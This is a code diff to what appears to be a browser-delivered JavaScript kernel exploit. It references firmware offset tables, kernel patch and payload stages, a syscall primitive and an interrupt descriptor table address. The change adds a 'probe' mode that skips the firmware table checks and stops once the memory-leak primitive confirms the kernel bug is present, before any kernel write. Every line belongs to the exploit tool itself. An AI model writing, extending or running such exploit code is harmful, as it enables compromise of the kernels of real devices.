@@ -10,6 +10,7 @@ let passCount = 0,
   failCount = 0;
 let armedEver = false;
 const params = new URLSearchParams(location.search);
+const PROBE_MODE = params.get("probe") === "1";
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
 function post(tag, detail) {
@@ -435,7 +436,7 @@ let allDone = false,
     if (
       !check(
         "kernel-table-present",
-        missing.length === 0,
+        missing.length === 0 || PROBE_MODE,
         "fw=" +
           fwKey +
           " missing=[" +
@@ -456,7 +457,7 @@ let allDone = false,
     if (
       !check(
         "kpatch-table-present",
-        !DO_PATCH || needPatch.length === 0,
+        !DO_PATCH || PROBE_MODE || needPatch.length === 0,
         "missing=[" +
           needPatch.join(",") +
           "] blob=" +
@@ -471,7 +472,7 @@ let allDone = false,
     if (
       !check(
         "payload-table-present",
-        !DO_PAYLOAD || needPl.length === 0,
+        !DO_PAYLOAD || PROBE_MODE || needPl.length === 0,
         "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
       )
     )
@@ -884,7 +885,7 @@ let allDone = false,
     
     if (params.get("hx1400") === "1") {
       try {
-        const hx = await import("./hx1400_port.js?v=1");
+        const hx = await import("./hx1400_port.js?v=6");
 
         const hxOk = await hx.runHx1400({
           p: p,
@@ -2301,6 +2302,14 @@ const pid = sc(SYS.getpid).i32;
     // kernel, so from here a failure must NOT auto-reload. Reset the counter
     // so the next manual run starts fresh.
     clearRetry();
+
+    if (PROBE_MODE) {
+      mark(
+        "PROBE-DONE",
+        "leak primitive validated on this FW - kernel bug is ALIVE; stopping before any kernel write",
+      );
+      return;
+    }
 
     const IDT = new int64(0x00001a00, 0xffffff80);
     const GATE_SZ = 16;
